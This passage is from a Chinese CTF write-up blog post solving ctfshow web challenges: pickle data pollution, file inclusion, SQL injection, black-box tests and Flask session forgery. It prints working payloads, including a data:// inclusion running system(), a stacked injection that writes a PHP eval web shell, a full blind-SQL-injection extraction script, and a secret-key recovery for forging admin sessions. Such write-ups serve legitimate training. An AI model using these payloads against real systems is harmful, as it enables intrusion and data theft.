print(info)<br>    print(&quot;name ====================&quot;)<br>    print(name)<br>    print(&quot;newname ====================&quot;)<br>    print(newname)<br>    info = info.replace(name, newname)<br>    print(info)<br>    file.close()<br>    with open(name.decode()+ &quot;_info&quot;, &quot;wb&quot;) as f:<br>        f.write(info)<br>    return &quot;success&quot;#直接替换文件中所有匹配 name 字节的位置为 newname 字节。如果文件内容包含 b&quot;1&quot;，则替换为 b&quot;0&quot;。<br></code></pre></td></tr></table></figure>
+
+<p>在&#x2F;changel路由会进行name和newname的交换</p>
+<p>总的来说就是，我们先需要给name赋值，然后在&#x2F;change路由给name和newname的值交换一下</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">本地测试了一下<br>import requests<br>import base64<br>url=&quot;http://127.0.0.1:8888/&quot;<br>requests.get(url+&#x27;?name=abc&#x27;)<br>requests.get(url+&#x27;change?name=&#x27;+base64.b64encode(b&#x27;abc&#x27;).decode()+&#x27;&amp;newname=&#x27;+base64.b64encode(b&quot;abc\nsVid\nI0\nsb.&quot;).decode())<br>r = requests.get(url+&#x27;dacaiji?name=abc&#x27;)<br>print(r.text)<br>把abc改为abc\nsVid\nI0\nsb.<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">效果如下<br>old_info ====================<br>b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nRookie\nc__builtin__\nobject\nNtR(dVname\nVabc\nsVid\nI2\nsb.&#x27;<br>name ====================<br>b&#x27;abc&#x27;<br>newname ====================<br>b&#x27;abc\nsVid\nI0\nsb.&#x27;<br>b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nRookie\nc__builtin__\nobject\nNtR(dVname\nVabc\nsVid\nI0\nsb.\nsVid\nI2\nsb.&#x27;<br>成功污染，然后换靶机地址就行<br></code></pre></td></tr></table></figure>
+
+<h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><h3 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">扫一下目录，存在 flag.php 和 page.php<br>然后/page.php?id=1  看报错有个file_get_contents函数 这应该是有个文件包含漏洞<br>/page.php?id=flag这样就行了<br></code></pre></td></tr></table></figure>
+
+<h3 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">查看源码<br>在 /alsckdfy<br></code></pre></td></tr></table></figure>
+
+<h3 id="web382-3"><a href="#web382-3" class="headerlink" title="web382&#x2F;3"></a>web382&#x2F;3</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">1&#x27; or 1 #  万能密码<br></code></pre></td></tr></table></figure>
+
+<h3 id="web384"><a href="#web384" class="headerlink" title="web384"></a>web384</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">两位字母三个数字直接爆破密码  xy123  账号猜测admin<br></code></pre></td></tr></table></figure>
+
+<h3 id="web385"><a href="#web385" class="headerlink" title="web385"></a>web385</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">扫目录 install，/install/?install重置账号和密码<br>回到之前382那边sqlmap注入一下得到密码<br>admin admin888<br></code></pre></td></tr></table></figure>
+
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>if(isset($_GET[&#x27;file&#x27;]))&#123;<br>    $file = $_GET[&#x27;file&#x27;];<br>    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);<br>    include($file);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>过滤了php,那我们可以利用伪协议与base64绕过</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=<br>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system(&#x27;cat flag.php&#x27;);<br></code></pre></td></tr></table></figure>
+
+<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p>两种方法，</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">1.日志包含，ua头改一句话木马<br>2.通过大小写绕过进行伪协议?file=PhP://input然后构造一句话木马<br></code></pre></td></tr></table></figure>
+
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">password=;select 0x3c3f706870206576616c28245f504f53545b315d293b3f3e into outfile &quot;/var/www/html/1.php&quot;;%23 &amp;username=admin\<br></code></pre></td></tr></table></figure>
+
+<p><strong>写马</strong></p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br>import string<br><br>URL = &quot;http://572fe0c5-f664-4d7c-a5c2-c372d1791aa6.challenge.ctf.show/login.php&quot;<br><br>FAIL = &quot;script&quot; # 登录失败时的响应头<br><br>def send_payload(payload):<br>    data = &#123;<br>        &quot;username&quot;: payload,<br>        &quot;password&quot;: &quot;1111&quot;<br>    &#125;<br>    resp = requests.post(URL, data=data, allow_redirects=False)<br>    return resp.text.find(FAIL) == -1<br><br>def get_length(payload_template, min_len=1, max_len=100):<br>    for l in range(min_len, max_len):<br>        payload = payload_template.format(l)<br>        if send_payload(payload):<br>            return l<br>    return None<br><br>def get_string(payload_template, length):<br>    result = &quot;&quot;<br>    chars = string.ascii_letters + string.digits + &quot;_&#123;&#125;@.-,! &quot;<br>    for i in range(1, length+1):<br>        for c in chars:<br>            payload = payload_template.format(i, c)<br>            if send_payload(payload):<br>                result += c<br>                print(f&quot;\r&#123;result&#125;&quot;, end=&quot;&quot;, flush=True)<br>                break<br>    print()<br>    return result<br><br>def get_table_names():<br>    length=get_length(&quot;admin&#x27; and (select length(group_concat(table_name)) from information_schema.tables where table_schema=database())=&#123;&#125;;#---&quot;)<br>    print(length)<br>    names=get_string(&quot;admin&#x27; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;);#---&quot;,length)<br>    print(names.split(&#x27;,&#x27;))<br>    return names.split(&#x27;,&#x27;)<br><br>def get_column_names(table):<br>    length=get_length(f&quot;admin&#x27; and (select length(group_concat(column_name)) from information_schema.columns where table_name=&#x27;&#123;table&#125;&#x27;)=&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;&#125;&#125;;#---&quot;)<br>    print(length)<br>    names=get_string(f&quot;admin&#x27; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;&#123;table&#125;&#x27;),&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;&#125;&#125;,1))=ascii(&#x27;&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;&#125;&#125;&#x27;);#---&quot;,length)<br>    return names.split(&#x27;,&#x27;)<br><br>def get_field(table,column,row=0):<br>    length=get_length(f&quot;admin&#x27; and (select length(&#123;column&#125;) from &#123;table&#125; limit &#123;row&#125;,1)=&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;&#125;&#125;;#---&quot;,max_len=256)<br>    print(length)<br>    if length is None:<br>        print(f&quot;[!] Cannot determine length for &#123;column&#125; in &#123;table&#125; row &#123;row&#125;, skipping.&quot;)<br>        return &quot;&quot;<br>    name=get_string(f&quot;admin&#x27; and ascii(substr((select &#123;column&#125; from &#123;table&#125; limit &#123;row&#125;,1),&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;&#125;&#125;,1))=ascii(&#x27;&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;&#125;&#125;&#x27;);#---&quot;,length)<br>    return name<br><br>if __name__==&quot;__main__&quot;:<br>    tables=get_table_names()<br>    for table in tables:<br>        columns = get_column_names(table)<br>        for col in columns:<br>            for row in range(2):<br>                get_field(table, col, row)<br></code></pre></td></tr></table></figure>
+
+<h2 id="Flask-Session伪造"><a href="#Flask-Session伪造" class="headerlink" title="Flask_Session伪造"></a>Flask_Session伪造</h2><p>file:&#x2F;&#x2F;&#x2F;app&#x2F;app.py读源码</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs text"># encoding:utf-8<br>import re, random, uuid, urllib.request<br>from flask import Flask, session, request<br><br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*100)<br>print(app.config[&#x27;SECRET_KEY&#x27;])<br>app.debug = False<br><br>@app.route(&#x27;/&#x27;)<br>def index():<br>    session[&#x27;username&#x27;] = &#x27;guest&#x27;<br>    return &#x27;CTFshow 网页爬虫系统 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;读取网页&lt;/a&gt;&#x27;<br><br>@app.route(&#x27;/read&#x27;)<br>def read():<br>    try:<br>        url = request.args.get(&#x27;url&#x27;)<br>        if re.findall(&#x27;flag&#x27;, url, re.IGNORECASE):<br>            return &#x27;禁止访问&#x27;<br>        res = urllib.request.urlopen(url)<br>        return res.read().decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)<br>    except Exception as ex:<br>        print(str(ex))<br>    return &#x27;无读取内容可以展示&#x27;<br><br>@app.route(&#x27;/flag&#x27;)<br>def flag():<br>    if session.get(&#x27;username&#x27;) == &#x27;admin&#x27;:<br>        return open(&#x27;/flag.txt&#x27;, encoding=&#x27;utf-8&#x27;).read()<br>    else:<br>        return &#x27;访问受限&#x27;<br><br>if __name__==&#x27;__main__&#x27;:<br>    app.run(<br>        debug=False,<br>        host=&quot;0.0.0.0&quot;<br>    )<br></code></pre></td></tr></table></figure>
+
+<p>session中username必须为admin才能获取flag</p>
+<p>使用下面脚本获取随机数</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br>import uuid<br>import random<br>import os<br><br>url = &quot;&quot;<br><br>def get_randStr():<br>    response = requests.get(url + &quot;read?url=file:///sys/class/net/eth0/address&quot;)<br>    mac = response.text.strip()<br>    temp = mac.split(&#x27;:&#x27;)<br>    temp = [int(i,16) for i in temp]<br>    temp = [bin(i).replace(&#x27;0b&#x27;,&#x27;&#x27;).zfill(8) for i in temp]<br>    temp = &#x27;&#x27;.join(temp)<br>    mac = int(temp,2)<br>    random.seed(mac)<br>    randStr = str(random.random()*100)<br>    return randStr<br><br>if __name__ == &#x27;__main__&#x27;:<br>    randStr = get_randStr()<br>    print(&quot;Random String:&quot;, randStr)<br></code></pre></td></tr></table></figure>
+
+<p><code>/sys/class/net/eth0/address</code> 是 Linux 的 MAC 地址文件</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">D:\Download\flask-session-cookie-manager-master\flask-session-cookie-manager-master&gt;python flask_session_cookie_manager3.py decode -c &quot;eyJ1c2VybmFtZSI6Imd1ZXN0In0.aRnb1w.9M74PL2bw6RBk3FcUD5MA-XQ7R8&quot; -s &quot;18.743688974575345&quot;<br>&#123;&#x27;username&#x27;: &#x27;guest&#x27;&#125;<br><br>D:\Download\flask-session-cookie-manager-master\flask-session-cookie-manager-master&gt;python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot; -s &quot;18.743688974575345&quot;<br>eyJ1c2VybmFtZSI6ImFkbWluIn0.aRnfxA.af-ilpIl7eIbAcO_HVgHpzNDWUo<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/" class="category-chain-item">CTF题解</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/ctfshow/" class="category-chain-item">ctfshow</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctfshow/" class="print-no-link">#ctfshow</a>
+      
+        <a href="/tags/Node-js/" class="print-no-link">#Node.js</a>
+      
+        <a href="/tags/SSRF/" class="print-no-link">#SSRF</a>
+      
+        <a href="/tags/JWT/" class="print-no-link">#JWT</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ctfshow 杂项：Node/SSRF/JWT/文件包含</div>
+      <div>https://xendr1a.github.io/2025/10/18/ctfshow-misc/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xendr1a</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/10/23/0xgame2025-week2/" title="0xgame2025 week2">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">0xgame2025 week2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/15/newstar2025-week1/" title="newstar2025 week1">
+                        <span class="hidden-mobile">newstar2025 week1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
